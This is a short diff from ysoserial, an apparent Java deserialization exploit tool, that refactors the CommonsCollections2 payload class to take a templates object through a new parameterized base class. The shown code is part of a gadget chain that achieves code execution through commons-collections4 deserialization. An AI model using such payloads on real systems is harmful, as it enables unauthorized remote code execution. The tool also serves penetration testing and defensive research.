@@ -27,10 +27,10 @@ import ysoserial.payloads.util.Reflections;
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies({ "org.apache.commons:commons-collections4:4.0" })
 @Authors({ Authors.FROHOFF })
-public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
+public class CommonsCollections2 extends ParameterizedTransletObjectPayload<Queue<Object>> {
 
-	public Queue<Object> getObject(final String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
+	@Override
+	protected Queue<Object> getObject(Object templates) throws Exception {
 		// mock method name until armed
 		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
